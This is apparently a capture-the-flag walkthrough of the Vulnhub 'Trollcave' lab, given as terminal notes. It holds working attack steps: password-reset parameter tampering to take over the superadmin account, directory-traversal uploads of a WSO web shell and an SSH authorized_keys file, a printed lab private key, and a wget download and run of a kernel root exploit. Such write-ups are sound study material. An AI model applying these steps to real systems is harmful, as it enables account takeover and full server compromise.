@@ -1,0 +1,161 @@
+Video Solution: https://youtu.be/2FvS9CukbUs
+Task on Vulnhub: https://www.vulnhub.com/entry/trollcave-12,230/
+
+λ  wargaming-challenges/vulnhub/trollcave master ✗ nmap -sP 1.1.1.134/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-15 00:46 EEST
+Nmap scan report for trollcave (1.1.1.113)
+Host is up (0.00036s latency).
+Nmap done: 256 IP addresses (4 hosts up) scanned in 15.87 seconds
+
+
+
+λ  wargaming-challenges/vulnhub/trollcave master ✗ python users.py
+King:Superadmin	:)
+dave:Admin	nah lol
+dragon:Admin	Over fire and over stone / Over water and over bone / Shining out like jewels of light / On a sheet of purest night
+coderguy:Admin	;)
+cooldude89:Moderator	i am the dankest
+Sir:Moderator	It's super secure
+Q:Moderator	Your normal password
+teflon:Moderator	swordfish
+TheDankMan:Regular member	420
+artemus:Regular member	garden
+MrPotatoHead:Regular member	you know...
+Ian:Regular member	a
+kev:Member	mother's maiden name
+notanother:Member	(:
+anybodyhome:Member	no one is
+onlyme:Member	It is what it is
+xer:Member	fave pronoun
+
+
+Password reset http://1.1.1.113/blogs/6
+
+Google: ruby password_resets
+
+https://www.railstutorial.org/book/password_reset
+
+Try to change SuperAdmin Password
+Can only reset normal members' passwords for now
+
+Then try to change member password
+Reset email sent. http://1.1.1.113/password_resets/edit.FKu_H-2Z_3vcm9xT6g4W0A?name=xer
+
+Change name to SuperAdmin name
+Reset email sent. http://1.1.1.113/password_resets/edit.FKu_H-2Z_3vcm9xT6g4W0A?name=King
+
+Find File Manager
+http://1.1.1.113/user_files
+Try to upload file
+File upload is currently disabled
+
+Enable file upload in admin tab
+http://1.1.1.113/admin
+
+Try to upload again
+File uploaded.
+
+Find file path
+http://1.1.1.113/user_files/1 brute last number
+
+Found our uploaded file
+http://1.1.1.113/uploads/King/wso420.php
+
+But it's clear text
+
+With changing alternate file name found dir traversal
+Alter name: ../wso.php
+http://1.1.1.113/uploads/wso.php
+
+
+generate ssh key
+
+λ  wargaming-challenges/vulnhub/trollcave master ✗ ssh-keygen -f rails
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in rails.
+Your public key has been saved in rails.pub.
+The key fingerprint is:
+SHA256:eRbxR/UYcZ+uxtF0XyV4UZ5KqiQ7Ec4CErnHdJMrIzU glicone@genbook
+The key's randomart image is:
++---[RSA 2048]----+
+| ..   .   .  .*==|
+| ..E +     o...**|
+| .=.o o.  . .oo+*|
+| o.=..o .. .o.= +|
+|  o o. =S.o. o o.|
+|      . =o. . o  |
+|       o .   +   |
+|        .   .    |
+|                 |
++----[SHA256]-----+
+λ  wargaming-challenges/vulnhub/trollcave master ✗ mv rails.pub authorized_keys
+
+Now upload authorized_keys with path
+
+../../../../../../../../../home/rails/.ssh/authorized_keys
+
+File uploaded.
+
+λ  wargaming-challenges/vulnhub/trollcave master ✗ chmod 600 rails 
+λ  wargaming-challenges/vulnhub/trollcave master ✗ cat rails 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAp06jBOlNCrDNu0b0VvjTlYlUA75GsCEnvRje0V0CQQp0ddbB
+x/Ox31zDR9VREpI9IFsP8v2/ep8Gd6PKjSr24qgVYH7YALOFjnzIS6QVB4NpY1rJ
+DZ0xmtBvLLOGoOOmKm3wUfriPr8TcB4ryHhJedncuiBVU5bDMkke238z+O+Gma6+
+jpVLRda4shKCxmWnYPtg2xn26Ehrd4c5DiJWLKQwDPWPKceP0qtmj5aR3O9U9DPM
+X+SMq9b5WYmBdH7ucbCCJRU/BximQAtFgYF99mYTS+qKBBft1lpL2B9mQvH0Ob50
+IxMaU4/TmgU6OZ0ZX+cB+FZoN6oWnTV3bEV+lQIDAQABAoIBAEIITVsA4YFYqrpB
+lOpGpuucGeaoUKnvTAncKQUk2mDlSXXA3xaV3hw0NnbBgI/929ZLWo4jDFHPNfQ+
+VxFEZdCrWlSNe587O3kzUrJX/lzKxuuJx1RyOEPMBDT2Xipd7xVL8s/IX0c4julv
+XwRuRUGsdOuZG1Q0arIMHfuvxsl2zEdUxYq/U8ryPRA7fmVSdVeyF8pZ0V/MFuT4
+Grbb5SxjkR0ZaltB4lt/AjiryB1UXrUzVnx8PQZ0Am/GQcyMm5HDrTTRUN56T1/P
+5EVtptB86v0h2anrTDZFKEATkQWjhhpfebANHJXfzbspua4HxVZSYLjKf72B4Qgy
+gIJ/nEECgYEA3Qe51I7Dquo9DUKvKYyYPPMIZupxK7UqWpffgy1i6KahbcSXxxFO
+93J0hgPz9K98M50iOZenRbLvQcOF+5mMJA/uRSbCdKxd9FKlGTPqADlOCmnZMGSi
+VoSvn1BkyYIjbVUBvT+OK4bosMTtDr8qISX+rR1Xb0KHDio133F/qB0CgYEAwcb+
+vkIzTljjXSTWTsk+UOSuWr/t+kY+e2+R3FQplZ+8b0I5kDq2fvI+TYQxSJ/+o+hg
+2k0DNJ245Q5B5iWMl15DOm9iJ2jZyxrBUzm4EfoaRtGrdfh8FROeI5SyMFj110yQ
+BKpTV3tajkQ0kPxskAIXIny0Guee/+Ckz1WbltkCgYEApRoyS35g1nimJhObuBOX
+XF/F9OpGovluq8Eqalgqu9JMXywsm7xoGhpaxAiL4Eh9JCjJ+e84Oa4RXjRpDqmB
+ryZfOzRaqMBgZjKdtJe8wXIMw2aRn75sLOhsLzrkLkmRoQeQhwbEcesSQYi38v4E
+wEIbXMDAIRG2xHPvTfr/+lkCgYAExa/UY7D7xviifJvCiPY968PXfE6SEVTMmWzQ
+Lkpv4uUzIEBmqut/qNub8Rt9nGMbCkgIWEkx7Ih3K6i30EjsGWgycjfKnKxwchI8
+yHkeCDjJcbR1TU9Q/ZCxc6IHyskTKlGJq+AtkV4jjs50m6LY0RRcxxFwcC/cQV4N
+tSAF0QKBgA1Nay/c9QIZJmgE1UvqKoQY9rI8d8GWEFmjAJuckv4pB9yXR9+TPpuA
+leSkanXE0uNj/Swj1sgrRDDgPUH5Hh/dN7uRn+BCC5e2ihY7h79lYc60Kdz9Nun0
+EcFDRdsoHG3/bQV3eIHz3pZtnpnsQvNwH9f7fU79SYbry3w3P/GS
+-----END RSA PRIVATE KEY-----
+λ  wargaming-challenges/vulnhub/trollcave master ✗ mv rails id_rsa-rails
+λ  wargaming-challenges/vulnhub/trollcave master ✗ ssh -i id_rsa-rails rails@1.1.1.113 
+
+
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)
+
+exploit-db.com CVE-2017-16995
+https://www.exploit-db.com/exploits/44298/
+
+cd /tmp 
+wget https://www.exploit-db.com/download/44298.c
+$ gcc 44298.c -o exploit
+-sh: 3: gcc: not found
+
+compile an your machine, base64 compiled, then create file exploit.base64 on pwning machine with base64 compiled exploit
+$ nano exploit.base64
+$ cat exploit.base64 | base64 -d > exploit
+$ chmod u+x exploit
+$ ./exploit
+task_struct = ffff880028823800
+uidptr = ffff880029820244
+spawning root shell
+root@trollcave:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(rails)
+root@trollcave:/tmp# 
+root@trollcave:/tmp# ls /root
+flag.txt
+root@trollcave:/tmp# cat /root/flag.txt
+et tu, dragon?
+
+c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5
+
